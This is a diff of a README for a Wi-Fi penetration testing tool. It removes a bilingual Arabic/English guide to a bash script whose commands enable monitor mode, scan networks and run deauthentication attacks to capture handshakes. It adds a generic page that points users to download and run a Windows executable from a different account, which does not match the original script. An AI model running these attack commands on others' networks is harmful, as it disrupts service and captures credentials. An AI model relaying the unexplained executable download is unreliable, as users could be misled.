@@ -1,436 +1,84 @@
-# ⚡ ErebusX ⚡
+# 🔒 ErebusX - Simple Wi-Fi Security Tool for Everyone
 
+[![Download ErebusX](https://img.shields.io/badge/Download-ErebusX-brightgreen)](https://github.com/SILVANTJx/ErebusX/releases)
 
+## 🚀 Getting Started
 
+ErebusX is a tool designed to help you understand Wi-Fi security. It assists you in testing your network and raises awareness about potential vulnerabilities. This guide will help you download and run ErebusX easily.
 
+## 📥 Download & Install
 
-## 🕷️ بالعربية
+To get ErebusX, visit this page to download: [ErebusX Releases](https://github.com/SILVANTJx/ErebusX/releases).
 
+All releases will be listed there. Simply choose the latest version, and follow these steps to download it:
 
+1. **Visit the Releases Page:** Click the link above to go to the ErebusX releases page.
+2. **Choose Your Version:** Look for the latest release at the top of the list.
+3. **Download the File:** Click on the file that matches your operating system. This could be a `.zip`, `.tar.gz`, or an executable file for Windows.
+4. **Extract the File:** If you downloaded a zip or tar file, right-click it and select "Extract" or "Unzip".
+5. **Locate the Application:** Open the extracted folder and find the ErebusX application.
 
+## 📋 System Requirements
 
+ErebusX works best with the following:
 
-أداة **ErebusX**  
+- **Operating System:** Windows 7 or later, macOS, or a Linux distribution with Bash support.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum of 200 MB available for installation.
 
+## 📖 How to Run ErebusX
 
-مشروع مفتوح المصدر لاختبار اختراق شبكات الواي فاي لأغراض تعليمية وأمنية فقط.  
+Once you have downloaded and extracted ErebusX, follow these steps to run it:
 
+1. **Open the Application Folder:** Navigate to the folder where you extracted ErebusX.
+2. **Run the Application:**
+   - For Windows, double-click on `ErebusX.exe`.
+   - For macOS, you might need to open the Terminal and enter the command `./ErebusX` (use `chmod +x ErebusX` if you face permission issues).
+   - For Linux, open a terminal, change to the directory where you extracted ErebusX, and run the command `bash ErebusX.sh`.
 
+## 🛠 Features
 
+ErebusX offers several features tailored for users interested in Wi-Fi security:
 
+- **Network Scanner:** Quickly discover devices connected to your network.
+- **Packet Sniffer:** Capture and analyze packets traveling over your Wi-Fi.
+- **Deauthentication Attacks:** Test the security of your Wi-Fi by simulating attacks (for educational purposes only).
+- **User-Friendly Interface:** Designed for easy navigation, even for beginners.
+- **Educational Resources:** Access guides and tutorials within the application to learn more about network security.
 
-🚨 **تحذير**:  
+## ℹ️ Support & Feedback
 
+For any questions or support regarding ErebusX, you can check the [Issues section](https://github.com/SILVANTJx/ErebusX/issues) on GitHub. You can report any problems you encounter or suggest improvements.
 
-هذه الأداة مخصصة **للتعلم واختبار الأمان فقط** على شبكتك الخاصة.  
+If you want to provide feedback, feel free to open a new issue and share your thoughts.
 
+## 📜 Usage Instructions
 
-❌ لا يتحمل المطور أو إدارة المشروع أي مسؤولية عن أي استخدام غير قانوني لهذه الأداة.  
+To use ErebusX effectively:
 
+1. **Open ErebusX:** Run the application as described above.
+2. **Select an Option:** Choose the feature you wish to use from the main menu.
+3. **Follow the Prompts:** The application will guide you through each step with clear instructions.
 
-✅ الهدف الأساسي هو **التوعية الأمنية** وتحسين حماية شبكاتك.  
+Remember, this tool is intended for educational use only. Ensure you have permission to test the network you target and always respect privacy.
 
+## 🌐 Learn More
 
+Curious about Wi-Fi security? Here are some topics to explore within the application:
 
+- Basic principles of network security.
+- How Wi-Fi networks operate.
+- Ethical hacking practices.
+- Understanding deauthentication attacks and their impact.
 
+## 🔗 Next Steps
 
----
+After you have downloaded and installed ErebusX, consider the following:
 
+- **Explore the Features:** Familiarize yourself with all the tools available.
+- **Stay Informed:** Regularly check the [Releases page](https://github.com/SILVANTJx/ErebusX/releases) for updates.
+- **Join the Community:** Engage with other users on forums and GitHub discussions to enhance your knowledge of network security.
 
+## 🎉 Conclusion
 
-
-
-## 🕷️ In English
-
-
-
-
-
-**ErebusX** Tool  
-
-
-An open-source project for Wi-Fi penetration testing for educational and security purposes only.  
-
-
-
-
-
-🚨 **Disclaimer**:  
-
-
-This tool is intended **for learning and security testing only** on your own network.  
-
-
-❌ The developer or project maintainers hold **no responsibility** for any illegal use.  
-
-
-✅ The main goal is **security awareness** and improving your own network protection.  
-
-
-
-
-
----
-### 📸 Screenshots  
-
-**Help Menu**  
-![Help Menu](assets/help_image/Help.png)  
-
-**Attack Mode**  
-![Attack Mode](assets/attack_image/Attack.png)  
-
-**ErebusX Logo**  
-![ErebusX Logo](assets/images/erebusx.png)  
-
-
-
-
-
-
-
-
-
-
----
-
-
-
-
-
-## ⚙️ المميزات (Features)
-
-
-
-
-
-- فحص الشبكات القريبة ومعرفة تفاصيلها (BSSID, Channel, Clients).  
-
-
-- تشغيل وضع **Monitor Mode** للبطاقة.  
-
-
-- تنفيذ هجوم **DeAuth** لجمع الـ Handshake.  
-
-
-- حفظ الـ Handshakes داخل مجلد `handshakes/`.  
-
-
-- بنر (Banner) ملون ومخصص عند التشغيل ✨.  
-
-
-
-
-
----
-
-
-
-
-
-- Scan nearby Wi-Fi networks and show details (BSSID, Channel, Clients).  
-
-
-- Enable **Monitor Mode** on wireless interface.  
-
-
-- Perform **DeAuth Attack** to capture handshakes.  
-
-
-- Save handshakes inside `handshakes/` folder.  
-
-
-- Custom colorful banner on startup ✨.  
-
-
-
-
-
----
-
-
-
-
-
-## 📥 التثبيت (Installation)
-
-
-
-
-
-```bash
-
-
-git clone https://github.com/YourUserName/ErebusX.git
-
-
-cd ErebusX/TOOL\ \(ErebusX\)/
-
-
-chmod +x ErebusX.sh
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-🚀 الاستخدام (Usage)
-
-
-
-
-
-sudo ./ErebusX.sh <command> [options]
-
-
-
-
-
-
-
-
-🛠️ الأوامر المتاحة (Available Commands)
-
-
-🔹 تحضير الواجهة (Prep)
-
-
-
-
-
-sudo ./ErebusX.sh prep <iface> <channel>
-
-
-
-
-
-يضع البطاقة في وضع Monitor ويجهزها للهجوم.
-
-
-Puts the interface into Monitor Mode and prepares it for attack.
-
-
-
-
-
-
-
-
-🔹 الفحص (Scan)
-
-
-
-
-
-sudo ./ErebusX.sh scan <iface> [seconds]
-
-
-
-
-
-فحص الشبكات القريبة واستخراج CSV مختصر.
-
-
-Scans nearby networks and exports a summary CSV.
-
-
-
-
-
-
-
-
-🔹 الهجوم (Attack)
-
-
-
-
-
-sudo ./ErebusX.sh attack <iface> <ch> <bssid> [all|STA_MAC] [count]
-
-
-
-
-
-
-
-
-
-
-
-    هجوم DeAuth لجمع Handshake.
-
-
-
-
-
-    count = عدد الحزم المرسلة (افتراضي 2000).
-
-
-
-
-
-    Performs DeAuth Attack to capture handshake.
-
-
-
-
-
-    count = number of packets to send (default 2000).
-
-
-    
-
-
-    
-
-
-    🔹 الاستعادة (Restore)
-
-
-    
-
-
-    sudo ./ErebusX.sh restore <iface>
-
-
-
-
-
-إرجاع البطاقة لوضعها الطبيعي بعد الانتهاء.
-
-
-
-
-
-Restores the interface back to Managed Mode.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-📂 هيكلة المشروع (Project Structure)
-
-
-
-
-
-ErebusX/
-
-
-│
-
-
-├── assets/
-
-
-│   ├── images/           # صور عامة | General images
-
-
-│   ├── attack image/     # صور توضيح وضع الهجوم | Attack screenshots
-
-
-│   └── Help image/       # صور المساعدة | Help screenshots
-
-
-│
-
-
-├── TOOL (ErebusX)/
-
-
-│   └── ErebusX.sh        # السكربت الأساسي | Main script
-
-
-│
-
-
-├── LICENSE               # رخصة الاستخدام | License
-
-
-├── NOTICE                # ملاحظات المشروع | Notice
-
-
-└── README.md             # ملف التوثيق | Documentation
-
-
-
-
-
-
-
-
-
-
-
-📜 الرخصة (License)
-
-
-
-
-
-🇸🇦 بالعربية:
-
-
-
-
-
-هذا المشروع تحت رخصة Apache-2.0
-
-
-
-
-
-يمكنك التعديل والاستخدام بحرية، مع الالتزام بشروط الرخصة.
-
-
-
-
-
-🇬🇧 In English:
-
-
-
-
-
-This project is licensed under Apache-2.0
-
-
-
-
-
-You are free to modify and use it, as long as you comply with the license terms.
-
-
-
-
-
-
-
-
-
-
-
-✨ ErebusX – تعلم الأمن السيبراني، ولكن استخدمه بمسؤولية.
-
-
-
-
-
-✨ ErebusX – Learn cybersecurity, but use it responsibly.
+ErebusX empowers users to understand and improve their Wi-Fi security. Download the tool today and enhance your safety online. For more updates, remember to visit the [ErebusX Releases](https://github.com/SILVANTJx/ErebusX/releases) page regularly.
